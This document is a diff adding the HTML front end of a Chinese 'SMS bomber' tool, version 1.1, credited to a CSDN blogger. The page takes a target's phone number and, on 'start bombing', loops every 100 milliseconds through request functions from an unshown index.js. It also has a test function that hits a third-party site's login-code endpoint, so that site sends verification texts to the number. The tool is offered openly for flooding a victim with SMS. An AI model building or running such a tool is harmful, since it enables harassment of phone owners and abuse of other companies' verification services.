@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>短信接口请求 V1.1</title>
+    <meta http-equiv="Access-Control-Allow-Origin" content="*">
+    <link href="plug/bootstrap/bootstrap.min.css" rel="stylesheet">
+    <script src="plug/jquery/jquery-3.4.1.min.js"></script>
+    <script src="plug/bootstrap/bootstrap.min.js"></script>
+    <script src="plug/crypto/crypto-js.js"></script>
+
+    <script src="index.js"></script>
+</head>
+
+<body>
+
+    <div class="row p-3">
+        <div class="col-12">
+            <div class="card border-danger border-1 m-auto" style="width: 500px;">
+                <div class="card-header bg-danger text-white" style="line-height: 32px">
+                    短信轰炸机 V1.1
+                    <a href="https://blog.csdn.net/weixin_43532890/article/details/114928740">
+                        <img src="assets/img/js-jun.jpg" class="float-right" width="32" height="32"
+                            style="border-radius: 50%">
+                    </a>
+                </div>
+                <div class="card-body pb-0">
+                    <div class="input-group mb-3">
+                        <div class="input-group-prepend">
+                            <span class="input-group-text">手机号</span>
+                        </div>
+                        <input type="text" class="form-control" placeholder="" id="phone">
+                    </div>
+                    <button class="btn btn-success" id="start" onclick="send()">开始轰炸</button>
+                    <button class="btn btn-danger" id="'end" onclick="end()">停止线程</button>
+                    <button class="btn btn-primary float-right" onclick="test()">单元测试</button>
+
+                    <div class="alert alert-success mt-3 text-center mb-0 p-2" id="msg" role="alert">准备轰炸</div>
+                </div>
+
+                <span class="w-100 text-center p-1" style="font-size: 12px">
+                    <a class="text-black-50"
+                        href="https://blog.csdn.net/weixin_43532890?spm=1001.2101.3001.5343">By:Js君</a>
+                </span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+
+        var timer = null
+        var index = 0
+
+        // 开始发送
+        function send() {
+
+            $('#start').attr('disabled', true)
+            $('#phone').attr('disabled', true)
+
+            var phone = $("#phone").val()
+
+            if (phone.length != 11) {
+                $('#msg').text('请输入正确的手机号')
+                return
+            }
+
+            $('#msg').text('正在向:' + phone + '发送')
+            $('#msg').show()
+
+            timer = setInterval(function () {
+                if (index >= requestList.length) {
+                    index = 0;
+                }
+                requestList[index++].fn(phone)
+            }, 100)
+        }
+
+        // 停止发送
+        function end() {
+            $('#start').attr('disabled', false)
+            $('#phone').attr('disabled', false)
+            $('#msg').text('准备轰炸')
+            clearTimeout(timer)
+        }
+
+        // 测试发送
+        function test(phone = ''/*这里填写测试手机号, 仅测试用*/) {
+            $.ajax({
+                url: 'https://editor.588ku.com/site-api/send-tel-login-code',
+                type: 'GET',
+                data: {
+                    num: phone,
+                },
+                async: false
+            });
+        }
+
+    </script>
+
+
+</body>
+
+</html>
